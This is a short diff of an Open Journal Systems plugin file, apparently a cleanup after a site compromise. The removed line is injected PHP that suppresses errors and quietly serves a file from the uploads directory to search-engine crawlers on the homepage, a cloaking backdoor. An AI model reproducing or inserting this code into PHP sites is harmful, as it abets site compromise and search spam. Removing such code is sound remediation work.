@@ -1,5 +1,5 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/home/wwwjurna1/filejurnalrelawan/journals/1/articles/4/64e2cc026e200'); exit; }
+
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.php
  *
